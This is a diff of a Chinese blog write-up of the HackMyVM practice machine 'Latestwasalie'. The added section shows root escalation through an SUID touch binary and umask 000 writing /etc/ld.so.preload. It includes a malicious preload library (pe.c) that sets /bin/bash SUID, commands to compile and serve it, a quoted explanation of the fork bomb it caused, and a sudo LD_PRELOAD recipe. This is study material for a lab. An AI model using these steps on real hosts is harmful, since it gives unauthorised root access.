@@ -26,11 +26,14 @@
 <meta property="og:site_name" content="Skyarrow&#39;s blog">
 <meta property="og:description" content="来吧 来吧 再来一杯吧  去吧 去吧 都离我而去吧  靶机ip:192.168.56.51 难度:低(个人认为算中等) 涉及内容: 信息收集与枚举: 端口扫描、虚拟主机 (Vhost) 识别、Docker Registry API 探测。 凭证爆破: 基于 HTTP Basic Auth 的 Hydra 字典爆破。 供应链攻击 (Supply Chain Attack): 私有镜像仓库投毒、Sko">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/04/17/HackMyVM-Latestwasalie/msedge_nrvEnqbl4Z.png">
+<meta property="og:image" content="http://example.com/2026/04/17/HackMyVM-Latestwasalie/msedge_hVYl0IVWi9.png">
 <meta property="article:published_time" content="2026-04-17T13:40:42.000Z">
-<meta property="article:modified_time" content="2026-04-17T15:46:31.651Z">
+<meta property="article:modified_time" content="2026-04-20T13:46:45.639Z">
 <meta property="article:author" content="Skyarrow">
 <meta property="article:tag" content="HVM">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/04/17/HackMyVM-Latestwasalie/msedge_nrvEnqbl4Z.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -237,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.1k words
+          6.7k words
         
       </span>
     
@@ -248,7 +251,7 @@
         
         
         
-          43 mins
+          56 mins
         
       </span>
     
@@ -402,6 +405,71 @@
 
 <p>成了</p>
 <p>还是很不错的一台靶机,供应链投毒很少遇到,这次学到了</p>
+<hr>
+<p>二补：关于touch的suid位</p>
+<p>群主提到了关于touch的利用方式</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crystal">backupusr<span class="hljs-variable">@latestwasalie</span>:~<span class="hljs-variable">$ </span>find / -perm -<span class="hljs-number">4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span><br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/dbus-1.0/dbus</span>-daemon-launch-helper<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/openssh/ssh</span>-keysign<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/touch</span><br></code></pre></td></tr></table></figure>
+
+<p>借用一下群主的图</p>
+<p><img src="/2026/04/17/HackMyVM-Latestwasalie/msedge_nrvEnqbl4Z.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以看到a是644，那为什么是644呢</p>
+<p>因为umask的原因，默认的umask是022，默认的666权限减去022就是644</p>
+<p>我们把umask弄成000我们就能实现任意文件写入的功能</p>
+<p>（我是在本地操作的，靶机已经删了）</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># umask 000</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># touch 1</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># ls -al 1</span><br>-rw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">10</span>:<span class="hljs-number">25</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/17/HackMyVM-Latestwasalie/msedge_hVYl0IVWi9.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合hacktricks里的preload我们可以touch恶意so文件然后用任意一个suid二进制文件触发</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">backupusr<span class="hljs-variable">@latestwasalie</span>:<span class="hljs-regexp">/tmp$ ls -al /</span>etc/ld.so.preload<br>id<br>^C^C^C^C^Cexit<br>^Csh: <span class="hljs-number">1</span>: Cannot <span class="hljs-keyword">fork</span><br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br>sh: <span class="hljs-number">1</span>: Cannot <span class="hljs-keyword">fork</span><br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br>sh: <span class="hljs-number">1</span>: Cannot <span class="hljs-keyword">fork</span><br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br>sh: <span class="hljs-number">1</span>: Cannot <span class="hljs-keyword">fork</span><br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br>sh: <span class="hljs-number">1</span>: Cannot <span class="hljs-keyword">fork</span><br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br><span class="hljs-keyword">chmod</span>: cambiando los permisos de <span class="hljs-string">&#x27;/bin/bash&#x27;</span>: Operación <span class="hljs-keyword">no</span> permitida<br><br></code></pre></td></tr></table></figure>
+
+<p>这里会崩掉，但是理论上（群主的视频）换成别的命令应该是可以成功的</p>
+<p>成了。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# ssh backupusr@192.168.56.51<br>Linux latestwasalie 6.12.74+deb13<span class="hljs-string">+1</span>-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74<span class="hljs-string">-2</span> (2026<span class="hljs-string">-03</span><span class="hljs-string">-08</span>) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Mon Apr 20 15:23:06 2026 from 192.168.56.104<br><span class="hljs-keyword">ERROR: </span>ld.so: object &#x27;/tmp/pe.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>-bash<span class="hljs-string">-5</span>.2$ id<br><span class="hljs-keyword">ERROR: </span>ld.so: object &#x27;/tmp/pe.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>uid=1000(backupusr) gid=1000(backupusr) grupos=1000(backupusr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)<br>-bash<span class="hljs-string">-5</span>.2$ ls -al /bin/bash<br><span class="hljs-keyword">ERROR: </span>ld.so: object &#x27;/tmp/pe.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>-rwsr-xr-x 1 root root 1298416 mar  8 16:21 /bin/bash<br>-bash<span class="hljs-string">-5</span>.2$ <br><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这绝对是一个非常经典的“踩坑”时刻！在 CTF 或者实际的安全研究中，因为 <code>/etc/ld.so.preload</code> 导致靶机或系统崩溃（甚至不得不重装）是极常发生的事情。你遇到的这个情况叫做<strong>无意中触发了“Fork 炸弹”（Fork Bomb）</strong>。</p>
+<p>下面为你详细拆解为什么系统会崩掉，以及终端里那些报错是怎么来的：</p>
+<h3 id="1-致命的连锁反应：无限套娃"><a href="#1-致命的连锁反应：无限套娃" class="headerlink" title="1. 致命的连锁反应：无限套娃"></a>1. 致命的连锁反应：无限套娃</h3><p>你使用的提权手法核心思路是：将恶意动态链接库（<code>pe.so</code>）写入 <code>/etc/ld.so.preload</code>。 与环境变量 <code>LD_PRELOAD</code> 只作用于单次命令不同，<strong><code>/etc/ld.so.preload</code> 是全局生效的</strong>。这意味着系统上<strong>每一次</strong>启动新进程，都会强制先加载你的 <code>pe.so</code> 并执行里面的 <code>_init()</code> 函数。</p>
+<p>问题出在 <code>pe.c</code> 代码中的这一句：</p>
+<p>C</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">system(<span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>在 C 语言中，<code>system()</code> 函数的底层实现是派生（fork）出一个新的子进程，并调用 <code>/bin/sh -c &quot;你的命令&quot;</code> 来执行。</p>
+<p>于是，恐怖的死循环开始了：</p>
+<ol>
+<li>你在终端敲了任何一个命令（比如 <code>id</code> 或 <code>ls</code>）。</li>
+<li>系统加载 <code>pe.so</code>，执行 <code>_init()</code>。</li>
+<li><code>_init()</code> 运行到 <code>system()</code>，系统<strong>派生出一个新的 <code>/bin/sh</code> 进程</strong>去执行 chmod。</li>
+<li>因为启动了新的 <code>/bin/sh</code> 进程，系统<strong>再次读取 <code>/etc/ld.so.preload</code></strong>，并把 <code>pe.so</code> 加载到这个新的 <code>/bin/sh</code> 进程中。</li>
+<li>这个新的进程又触发了 <code>_init()</code>。</li>
+<li><code>_init()</code> 再次调用 <code>system()</code>，又派生出一个新的 <code>/bin/sh</code>……</li>
+</ol>
+<p>几百毫秒内，系统就会裂变出成千上万个 <code>/bin/sh</code> 进程。</p>
+<h3 id="2-报错信息解读"><a href="#2-报错信息解读" class="headerlink" title="2. 报错信息解读"></a>2. 报错信息解读</h3><p>终端里出现的报错完美印证了这个过程：</p>
+<ul>
+<li><strong><code>sh: 1: Cannot fork</code></strong> 这是系统发出的哀嚎。因为进程无限裂变，瞬间耗尽了系统允许的最大进程数量（PID 耗尽）或内存。系统无法再创建任何新进程，此时哪怕你敲 <code>ls</code> 或者试图杀掉进程都没用了，机器彻底假死卡崩。</li>
+<li><strong><code>chmod: cambiando los permisos de &#39;/bin/bash&#39;: Operación no permitida</code> (操作不允许)</strong> 这是因为 <code>/etc/ld.so.preload</code> 影响的是<strong>所有用户</strong>的<strong>所有进程</strong>。如果当前触发该库的进程不是 root 权限（比如你用普通用户 <code>backupusr</code> 执行的命令，或者系统后台的其他低权限守护进程），它也会去执行 <code>chmod u+s /bin/bash</code>，但由于没有 root 权限，就会报错“权限不足”。</li>
+</ul>
+<h3 id="3-为什么代码里的-unsetenv-没拦住？"><a href="#3-为什么代码里的-unsetenv-没拦住？" class="headerlink" title="3. 为什么代码里的 unsetenv 没拦住？"></a>3. 为什么代码里的 <code>unsetenv</code> 没拦住？</h3><p>你的代码里有一句：<code>unsetenv(&quot;LD_PRELOAD&quot;);</code> 这行代码的作用是清除 <code>LD_PRELOAD</code> 环境变量以防止死循环。<strong>但是，它防不住 <code>/etc/ld.so.preload</code> 文件！</strong> 环境变量被清空了，但系统加载器在启动新进程时，依然会傻傻地去读取那个全局配置文件，导致防御机制失效。</p>
+</blockquote>
+<blockquote>
+<h3 id="LD-PRELOAD-与-LD-LIBRARY-PATH"><a href="#LD-PRELOAD-与-LD-LIBRARY-PATH" class="headerlink" title="LD_PRELOAD 与 LD_LIBRARY_PATH"></a><strong>LD_PRELOAD 与 LD_LIBRARY_PATH</strong></h3><p><code>LD_PRELOAD</code> 环境变量用于指定一个或多个共享库（<code>.so</code> 文件），让加载器在加载所有其他库（包括标准 C 库 <code>libc.so</code>）之前优先加载它们。这个过程被称为“预加载”（preloading）库。</p>
+<p>然而，为了维护系统安全并防止该功能被恶意利用（特别是在处理 <code>suid/sgid</code> 可执行文件时），系统会强制执行以下限制条件：</p>
+<ul>
+<li>当可执行文件的真实用户 ID（ruid）与有效用户 ID（euid）不匹配时，加载器会忽略 <code>LD_PRELOAD</code>。</li>
+<li>对于具有 <code>suid/sgid</code> 权限的可执行文件，只有位于标准路径下且同样具有 <code>suid/sgid</code> 权限的库才会被预加载。</li>
+</ul>
+<p>如果你有权使用 <code>sudo</code> 执行命令，并且 <code>sudo -l</code> 的输出中包含 <code>env_keep+=LD_PRELOAD</code> 语句，就可能发生权限提升。这种配置允许 <code>LD_PRELOAD</code> 环境变量在通过 <code>sudo</code> 运行命令时依然保留并被识别，从而可能导致以提升的权限（root）执行任意代码。</p>
+<figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">Defaults        env_keep +</span>=<span class="hljs-string"> LD_PRELOAD</span><br></code></pre></td></tr></table></figure>
+
+<p>将以下代码保存为 <code>/tmp/pe.c</code>：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/tmp]<br>└─<span class="hljs-meta"># vim pe.c</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/tmp]<br>└─<span class="hljs-meta"># gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/tmp]<br>└─<span class="hljs-meta"># python -m http.server 80</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br>^C<br><span class="hljs-built_in">Keyboard</span> interrupt received, exiting.<br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/tmp]<br>└─<span class="hljs-meta"># cat pe.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>  <span class="hljs-comment">// Added to define setuid() and setgid()</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    <span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>然后使用以下命令<strong>编译它</strong>：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /tmp<br>gcc -fPIC -shared -<span class="hljs-keyword">o</span> <span class="hljs-keyword">pe</span>.<span class="hljs-keyword">so</span> <span class="hljs-keyword">pe</span>.<span class="hljs-keyword">c</span> -nostartfiles<br></code></pre></td></tr></table></figure>
+
+<p>最后，运行以下命令来<strong>提升权限</strong>：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo LD_PRELOAD=./<span class="hljs-keyword">pe</span>.<span class="hljs-keyword">so</span> <span class="hljs-symbol">&lt;COMMAND&gt;</span> # <span class="hljs-symbol">&lt;COMMAND&gt;</span> 替换为任何你有权通过 sudo 运行的命令<br></code></pre></td></tr></table></figure></blockquote>
 
                 
               </div>
@@ -470,6 +538,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2026/04/20/Proving-Grounds-Practice-Jacko/" title="Proving Grounds Practice-Jacko">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Proving Grounds Practice-Jacko</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
